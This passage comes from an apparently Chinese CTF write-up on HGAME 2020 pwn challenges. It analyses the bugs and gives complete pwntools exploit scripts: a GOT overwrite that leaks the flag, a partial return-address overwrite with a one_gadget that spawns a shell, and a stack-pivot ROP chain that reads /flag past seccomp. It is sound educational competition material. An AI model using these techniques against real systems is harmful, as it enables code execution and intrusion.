sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
gdb.attach(p,cmd)

#info
strcmp_got = elf.got['strcmp']

ru('There is a back door..."Hacked by Annevi!"\n')
sl(str(strcmp_got))
sl('\x26') # strcmp_got -> printf_got 
ru('Password:')
sl('%s') # strcmp(password,flag) -> printf("%s",flag)
flag = ru('Wrong Password!\n')

log.info('flag is: ' + flag)

p.interactive()
```



### 形而上的坏死

 - 题目描述：Can you deceive the world？The lonely observer！
 - 题目地址：[Metaphysical_Necrosis](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week2_4/Metaphysical_Necrosis)
 - 考察点：视力(官方)
 - 难度：中等
 - 分值：400
 - 完成人数：19

#### 0x0 准备工作

首先查保护机制，能打开的都打开了。。

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

先执行一下程序，熟悉下程序的流程：

```shell
% ./Metaphysical_Necrosis
这一天，你在路上偶遇了睿智的逆向出题人:The eternal God Y!
只见他拿着一把AWP不知道在那瞄谁。
他发现了你，喜出望外:兄弟，包给你快去下包，我帮你架点!
你要把C4安放在哪里呢？
5
AAAA
the bomb has been planted!

a few moments later~
快过年了，正好有一条养了一年多的金枪鱼最近看起来闷闷不乐。
不如把它宰了，吃一顿大餐，你说吼不吼啊！

但是这一年多对它也有了些许感情，因此为了纪念它，你决定给它起个名字:Chutiren
------------------------------------------------------------------
接下来开始切菜，你打算把它切成几段呢？
2
------------------------------------------------------------------
为了满足每个人不同的口味，每一段都打算用不同的烹饪方法。顺带一提，我喜欢糖醋金枪鱼
第0段打算怎么料理呢：0000
第1段打算怎么料理呢：1111
接下来你打算把剩下的鱼骨头做成标本。
-----------------------------------------------------------
|                                                         |
Chutiren
|                                                         |
-----------------------------------------------------------
就在此时，你发现了一根茄子，这根茄子居然已经把锅里的金枪鱼吃了大半。

仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。

你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:
5
E99p1ant落地后，发现旁边居然有一个C4……Bomb！Terrorist Win
AAAA
E99p1ant不甘地大喊:啊~~！~？~…____

E99p1ant变成了茄酱。
[1]    13687 segmentation fault (core dumped)  ./Metaphysical_Necrosis
```

#### 0x1 程序分析

`game()`函数在`main()`中被调用：

```c
__int64 game(){
  __int64 ji_duan; // [rsp+0h] [rbp-C0h]
  __int64 v2; // [rsp+8h] [rbp-B8h]
  int v3; // [rsp+8h] [rbp-B8h]
  char v4[160]; // [rsp+10h] [rbp-B0h]
  char v5[8]; // [rsp+B0h] [rbp-10h]
  unsigned __int64 v6; // [rsp+B8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  LODWORD(v2) = 0;
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts(&s);
  puts(&byte_1008);
  puts(&byte_1040);
  puts(&byte_1098);
  HIDWORD(v2) = readi();
  read(0, &v5[8 * HIDWORD(v2)], 8uLL);
  puts("the bomb has been planted!");
  getchar();
  puts("a few moments later~");
  puts(&byte_10F0);
  puts(&byte_1148);
  getchar();
  printf(&format);
  read_n(name, 48LL);
  puts("------------------------------------------------------------------");
  puts(&byte_1238);
  HIDWORD(ji_duan) = readi();
  if ( SHIDWORD(ji_duan) > 20 )
  {
    puts(&byte_1278);
    exit(0);
  }
  puts("------------------------------------------------------------------");
  puts(&byte_12A0);
  LODWORD(ji_duan) = 0;
  while ( BYTE4(ji_duan) > ji_duan )
  {
    printf(&byte_1320, ji_duan, ji_duan, v2);
    memset(&v4[8 * ji_duan], 0, 8uLL);
    read_n(&v4[8 * ji_duan], 8LL);
    LODWORD(ji_duan) = ji_duan + 1;
  }
  puts(&byte_1348);
  sleep(1u);
  puts("-----------------------------------------------------------");
  puts("|                                                         |");
  puts(name);
  puts("|                                                         |");
  puts("-----------------------------------------------------------");
  puts(&byte_1400);
  getchar();
  puts(&byte_1468);
  getchar();
  puts(&byte_14D8);
  LODWORD(v2) = readi();
  puts(aE99p1ant);
  write(1, &v5[8 * HIDWORD(v2)], 6uLL);
  puts(aE99p1ant_0);
  if ( flag1 == 1 )
  {
    read_n(&e99 + 8 * v3, 8LL);
    puts(aE99p1ant_1);
    flag1 = 0;
  }
  else
  {
    puts(&byte_15D8);
  }
  return 0LL;
}
```

#### 0x2 漏洞分析

主要的漏洞如下：

```c
  // 你要把C4安放在哪里呢？
  HIDWORD(v2) = readi();
  read(0, &v5[8 * HIDWORD(v2)], 8uLL);  
  // 改写栈地址
  
  // 你吓得立马扔掉了它，E99p1ant在空中飞行了114514秒，请问它经过的路程是__m:
  LODWORD(v2) = readi();
  puts(aE99p1ant);
  write(1, &v5[8 * HIDWORD(v2)], 6uLL);
  // 泄漏栈地址，地址同被改写栈地址
```

首先，确定一下能够被改写的栈地址：

- `readi()`读`0`，让`HIDWORD(v2)=0`   

- `read(0, &v5[8 * HIDWORD(v2)], 8uLL); `时，栈分布如下：

```assembly
0x7fffffffdad0 —▸ 0x555555554f30 (__libc_csu_init)
0x7fffffffdad8 ◂— 0x78b2cb0fd0178500
0x7fffffffdae0 —▸ 0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init)
0x7fffffffdae8 —▸ 0x555555554f28 (main+14)
0x7fffffffdaf0 —▸ 0x555555554f30 (__libc_csu_init) 
0x7fffffffdaf8 —▸ 0x7ffff7debb6b (__libc_start_main+235)
```

其中`0x7fffffffdad0`是`v5`的地址，其后依次是：

- `canary`
- `saved rbp1`
- `game`的返回地址
- `saved rbp2`
- `main`的返回地址

先前被改写的栈地址，在之后的  `write(1, &v5[8 * HIDWORD(v2)], 6uLL);`中又被泄漏出来

这里可以选择`readi()`读`3`泄漏程序的基址，也可以选择`readi()`读`5`泄漏`libc`的基址

泄漏程序基址似乎没啥用

虽然开了随机化保护，但是`libc`函数的后三位是不变的

于是可以覆盖`main`的返回地址`__libc_start_main+235`的末两位

#### 0x3 漏洞利用

题目给了`libc`，看一下`__libc_start_main`，其中`0x00020830`是`__libc_start_main+235`

```assembly
0x00020808      488d442420     lea rax, [rsp + 0x20]
0x0002080d      644889042500.  mov qword fs:[0x300], rax
0x00020816      488b059b363a.  mov rax, qword [reloc.__environ_184]
0x0002081d      488b742408     mov rsi, qword [rsp + 8]
0x00020822      8b7c2414       mov edi, dword [rsp + 0x14]
0x00020826      488b10         mov rdx, qword [rax]
0x00020829      488b442418     mov rax, qword [rsp + 0x18]
0x0002082e      ffd0           call rax
0x00020830      89c7           mov edi, eax
```

这题的关键是，想要完成攻击，修改栈地址的漏洞至少要利用__两次__：泄漏`libc`一次，`getshell`一次

`__libc_start_main`中`0x0002082e`这里的`call rax`就是`call main`

所以，覆盖`__libc_start_main+235`的末两位为`08`

这样既可以泄漏`__libc_start_main`，又能让程序再执行一遍`main`

泄漏出来`libc`后计算`one_gadget`的地址：

```shell
% one_gadget ./libc-2.23.so                 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
```

```python
offset_addr = 0x20808
offset_one_gadget = 0x45216
one_gadget = addr - offset_addr + offset_one_gadget
```

```assembly
[*] ret: 0x7f2f53727808
[*] one_gadget: 0x7f2f5374c216
```

在第二次执行`main`时，覆盖返回地址为`one_gadget`即可`getshell`



对了，题目中这里，有提示要再次执行`main()`：

```c
  if ( flag1 == 1 )
  {
    read_n(&e99 + 8 * v3, 8LL);
    puts(aE99p1ant_1);  
    flag1 = 0;
  }
  else
  {
    puts(&byte_15D8);  // 嗯？！世界线……被改变了，我的Reading Steiner触发了！
  }
```

#### 0x4 exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './Metaphysical_Necrosis'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = 'libc-2.23.so'
is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote=True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

# info
# gadget
# elf, libc

print ru('你要把C4安放在哪里呢？\n')
# debug()
sl('5')
if is_local:  se('\x43')
if is_remote: se('\x08')
sleep(1)
ru('the bomb has been planted!\n')
sl('')
print ru('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n')
sl('')
ru('起个名字:')
sl('Imagin')
ru('切成几段呢？\n')
sl('20')
for i in range(20):
	ru('怎么料理呢：')
	sl(p64(i+0xdeadbeef))
ru('金枪鱼吃了大半。\n')
sl('')
ru('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n')
sl('')
ru('的路程是__m:')
meter = 5 # 好像没啥用
sl(str(meter))

ru('Terrorist Win\n')
addr = u64(rc(6).ljust(8,'\0'))
log.hexdump(addr)
info_addr("ret",addr)

if is_remote:
    offset_addr = 0x20808
    offset_one_gadget = 0x45216
if is_local: 
    offset_addr = 0x26B43
    offset_one_gadget =  0x106ef8
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
'''

one_gadget = addr - offset_addr + offset_one_gadget
info_addr('one_gadget', one_gadget)

ru('~~！~？~…____\n')

#debug('b *'+hex(addr))
sl('')

# round2

print ru('你要把C4安放在哪里呢？\n')
sl('5')
se(p64(one_gadget)) # one_gadget
sleep(1)
ru('the bomb has been planted!\n')
sl('')
print ru('不如把它宰了，吃一顿大餐，你说吼不吼啊！\n')
sl('')
ru('起个名字:')
sl('Imagin')
ru('切成几段呢？\n')
sl('20')
for i in range(20):
    ru('怎么料理呢：')
    sl(p64(i+0xdeadbeef))
ru('金枪鱼吃了大半。\n')
sl('')
ru('仔细观察一下，你发现这居然是一只E99p1ant，并且有大量邪恶的能量从中散发。\n')
sl('')
ru('的路程是__m:')
meter = 5 # 好像没啥用
sl(str(meter))

ru('Terrorist Win\n')
addr = u64(rc(6).ljust(8,'\0'))
log.hexdump(addr)
info_addr("ret",addr)

ru('~~！~？~…____\n')

sl('')

p.interactive()
```



### week3

week3开题的时候...我正在看CCTV-8直播的绝代双骄，古龙的武侠小说写的真是精彩呀，新版的绝代双骄电视剧的还原度很高，而且排在春节黄金档，焉能不看！于是week3只做了一道题，没想到还拿了2血，剩下的都是堆的题，不会啊...

### ROP_LEVEL2

 - 题目描述：-
 - 题目地址：[ROP](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week3_1/ROP)
 - 考察点：ROP攻击、栈迁移、`seccomp`
 - 难度：中等
 - 分值：200
 - 完成人数：27

#### 0x0 背景姿势

这题和week1的ROP_LEVEL0差不多，但是开启了`seccomp`，且栈溢出只有8字节

`seccomp`用于关闭不必要的系统调用，比如`SYSCALL execve` 

#### 0x1 漏洞分析

- 栈溢出8字节，需要栈迁移

- 用`seccomp`关闭了`SYSCALL execve` 

  ```c
    v0 = seccomp_init(0x7FFF0000LL);
    seccomp_rule_add(v0, 0LL, 0x3BLL, 0LL);
    seccomp_load(v0);
  ```

- 不能用`system('/bin/sh')`，于是用`open+read+puts`打开`/flag`文件并打印

  - `open('/flag',0,0x100)`
  - `read(4,bss_base,0x100)`
  - `puts(bss_base)`

#### 0x2 exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './ROP'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400a43 # pop rdi ; ret
leave = 0x000000000040090d # leave ; ret
m3c = 0x00400a20
p6r = 0x00400a3a
prsi = 0x0000000000400a41 # pop rsi ; pop r15 ; ret
prbp = 0x0000000000400830 # pop rbp ; ret

# elf, libc
buf = 0x6010a0
open_func = 0x400985
read_plt = elf.symbols['read']
main = elf.symbols['main']
open_plt = elf.symbols['open']
puts_plt = elf.symbols['puts']
bss_base = elf.bss() + 0x200

# rop1
offset = 80
payload = '\0'*offset
payload += p64(buf)
payload += p64(leave)

# open('/flag',0,0x100)
stack = p64(p6r) + p64(0) + p64(1) + p64(buf+0x8*9) + p64(0x100) + p64(0) + p64(buf+0x8*18) + p64(m3c) + p64(open_plt)
# read(4,bss_base,0x100)
stack += p64(0) + p64(1) + p64(buf+0x8*17) + p64(0x100) + p64(bss_base) + p64(0x4) + p64(m3c) + p64(read_plt)
# padding
stack += '/flag\0\0\0'
stack += p64(0xdeadbeef)*5
# pust(bss_base)
stack += p64(prdi) + p64(bss_base) + p64(puts_plt) + p64(0xdeadbeef) 

ru('think so?')
sl('TaQini!!'+stack)
rc()
# debug()
sl(payload)
# sleep(3)
sl('TaQini is here~~~')

p.interactive()
```

### week4

week4只有两道题，想必是极难的，week3也还剩下3道题，留个坑，以后看。

(杭电出的题目，水准很高~ 必须点个赞^_^)



## 结尾

这次春节蹭新生赛，真是涨了不少姿势，感谢出题的杭电师傅们，感谢[imagin](https://imagin.vip/)师傅的帐号~

